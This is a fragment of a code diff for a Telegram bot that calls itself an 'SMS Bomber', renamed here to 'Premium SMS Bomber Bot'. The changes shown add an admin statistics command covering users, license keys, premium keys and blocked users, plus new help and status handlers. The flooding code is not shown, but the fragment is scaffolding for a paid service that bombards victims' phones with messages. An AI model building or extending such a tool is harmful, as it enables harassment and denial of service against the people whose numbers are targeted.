+        await update.message.reply_text(text, parse_mode='Markdown')
+    
+    elif action == 'stats':
+        db = load_db()
+        total_users = len(db['users'])
+        total_keys = len(db['keys'])
+        active_keys = sum(1 for k in db['keys'].values() if k['active'])
+        blocked_users = len(db['blocked'])
+        premium_users = sum(1 for k in db['keys'].values() if k.get('is_premium', False))
+        
+        await update.message.reply_text(
+            f"📊 *BOT STATISTICS*\n\n"
+            f"👥 Users: {total_users}\n"
+            f"🔑 Total Keys: {total_keys}\n"
+            f"✅ Active Keys: {active_keys}\n"
+            f"⭐ Premium Keys: {premium_users}\n"
+            f"🚫 Blocked Users: {blocked_users}\n\n"
+            f"💀 *@BeStChEaT_OwNeR*",
+            parse_mode='Markdown'
+        )
+    
+    else:
+        await update.message.reply_text("❌ Invalid action! Use: create, createpremium, list, delete, block, unblock, blockuser, unblockuser, users, stats")
 
 # --- Main Bot ---
 
 def main():
-    """Start the bot"""
     if not BOT_TOKEN or BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
         print("❌ Error: BOT_TOKEN not set!")
-        print("Please set BOT_TOKEN environment variable.")
         return
     
-    print("🤖 Starting Telegram SMS Bomber Bot...")
+    print("🤖 Starting Premium SMS Bomber Bot...")
     print(f"👤 Owner ID: {OWNER_ID}")
     print(f"🤖 Bot: {BOT_USERNAME}")
     print("🚀 Bot is running!")
     
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     
-    # Add handlers
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("key", key_command))
+    app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("status", status_command))
     app.add_handler(CommandHandler("redeem", redeem_command))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(CallbackQueryHandler(callback_handler))
     
-    # Start polling
     app.run_polling()
 
 if __name__ == '__main__':
